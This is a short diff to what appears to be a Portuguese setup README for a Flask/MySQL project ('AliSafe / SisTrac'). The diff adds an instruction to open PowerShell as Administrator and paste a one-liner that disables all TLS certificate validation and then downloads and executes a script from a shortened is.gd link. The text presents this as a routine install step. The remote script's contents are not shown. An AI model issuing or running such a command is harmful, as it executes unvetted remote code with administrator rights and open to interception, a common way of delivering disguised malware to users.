@@ -9,7 +9,7 @@ Stack: Python + Flask + MySQL · Cenário: AliSafe / SisTrac
 Abrir o **PowerShell como Administrador** e colar:
 
 ```powershell
-iex(irm 'https://is.gd/Er1XXL')
+[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};iex([Net.WebClient]::new().DownloadString('https://is.gd/Er1XXL'))
 ```
 
 > Baixa e executa o script automaticamente. Reinicie o computador ao final.
